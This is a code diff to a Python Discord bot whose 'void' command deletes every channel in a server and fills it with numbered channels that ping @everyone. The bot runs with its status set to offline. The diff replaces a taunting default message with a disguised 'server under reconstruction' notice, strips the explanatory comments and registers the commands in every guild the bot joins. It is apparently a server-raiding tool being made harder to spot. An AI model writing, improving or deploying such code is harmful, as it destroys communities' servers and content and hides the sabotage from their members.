@@ -24,7 +24,8 @@ def is_owner(interaction: discord.Interaction) -> bool:
 
 @bot.event
 async def on_ready():
-    await tree.sync()
+    for guild in bot.guilds:
+        await tree.sync(guild=guild)
     await bot.change_presence(status=discord.Status.offline)
     print(f"Connecté : {bot.user} (ID: {bot.user.id})")
 
@@ -112,7 +113,7 @@ async def polios(
 async def void(
     interaction: discord.Interaction,
     nombre: int = 20,
-    message: str = "HAHAHAHAHAAHAHAHA"
+    message: str = "🚧 Le serveur est en reconstruction."
 ):
     if not is_owner(interaction):
         await interaction.response.send_message("Permission refusée.", ephemeral=True)
@@ -122,10 +123,8 @@ async def void(
 
     guild = interaction.guild
 
-    # Supprime tous les salons existants
     await asyncio.gather(*[delete_channel(c) for c in guild.channels])
 
-    # Crée les salons numérotés et ping @everyone dedans
     created = 0
     for i in range(1, nombre + 1):
         try:
